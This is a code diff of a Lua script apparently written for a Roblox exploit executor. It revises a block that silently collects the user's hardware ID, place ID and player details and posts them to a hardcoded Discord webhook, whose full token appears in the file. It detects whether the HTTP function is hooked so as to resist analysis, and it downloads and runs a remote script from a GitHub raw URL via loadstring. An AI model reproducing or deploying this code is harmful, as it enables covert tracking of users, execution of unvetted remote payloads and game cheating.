@@ -1,15 +1,18 @@
 -- ============================================================
--- Webhook / tamper-report block (lives in the loadstring payload)
+-- Webhook / tamper-report block
+-- Lives in the loadstring payload (yest5), not the loader.
+-- Silent on the client: no print, no warn. Discord gets the report.
 -- ============================================================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1567787577543757876/txGj_ToV6qu4odkq7q1kWAqKgr3GD4BLuA6hg8wj4VA3sU5rGdgTj8CX14ylopd4v9ri"
 
-local HttpService    = game:GetService("HttpService")
-local Players        = game:GetService("Players")
-local sendRequest    = request or http_request
+local HttpService     = game:GetService("HttpService")
+local Players         = game:GetService("Players")
+local sendRequest     = request or http_request
 local payloadReported = false
 
+-- Resolve HWID / client ID across common executor APIs (best effort).
 local function resolveHwid()
-    local env = getfenv and getfenv(0) or _G
+    local env = (getfenv and getfenv(0)) or _G
     local candidates = {
         env.gethwid,
         env.get_hwid,
@@ -40,8 +43,7 @@ local function reportTamper(reason)
     local placeId = game.PlaceId
     local hwid    = resolveHwid()
 
-    if type(sendRequest) == "function"
-        and WEBHOOK_URL ~= "" then
+    if type(sendRequest) == "function" and WEBHOOK_URL ~= "" then
         task.spawn(function()
             pcall(function()
                 sendRequest({
@@ -71,14 +73,19 @@ local function reportTamper(reason)
     end)
 end
 
--- Guard inside the payload: verify the environment the payload runs in.
+-- Payload-side guard: verify the environment the payload runs in.
 do
-    local okHook, hooked = pcall(isfunctionhooked, sendRequest)
-    if okHook and hooked == true then
-        reportTamper("request/http_request is hooked in payload")
-        return
+    if type(isfunctionhooked) == "function"
+        and type(sendRequest) == "function" then
+        local okHook, hooked = pcall(isfunctionhooked, sendRequest)
+        if okHook and hooked == true then
+            reportTamper("request/http_request is hooked in payload")
+            return
+        end
     end
 end
+-- ============================================================
+-- ... rest of your main yest5 script below ...
 loadstring(game:HttpGet('https://raw.githubusercontent.com/yuvic123/Unthinkable-Present/refs/heads/main/UP'))()
 local Players, Teleport, Http, Core = game:GetService("Players"), game:GetService("TeleportService"), game:GetService("HttpService"), game:GetService("CoreGui")
 local LocalPlayer, placeId = Players.LocalPlayer, game.PlaceId
